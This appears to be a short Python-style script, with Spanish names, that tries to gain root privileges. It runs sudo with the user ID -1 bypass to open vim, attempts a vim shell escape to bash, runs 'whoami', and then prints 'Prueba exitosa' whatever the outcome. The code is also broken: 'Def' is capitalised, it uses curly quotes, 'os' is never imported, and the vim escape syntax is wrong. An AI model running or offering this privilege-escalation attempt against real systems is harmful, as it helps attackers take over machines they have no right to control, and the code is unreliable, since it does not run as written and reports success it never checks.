Def PruebaSUDO():
  Com1 = “sudo -u#-1 vim file1.txt”
  ComVim1 = “vim -c bash! file1.txt”
  Com2 = “whoami”
  os.system(Com1)
  os.system(ComVim1)
  os.system(Com2)
  print(“Prueba exitosa”)
 PruebaSUDO()
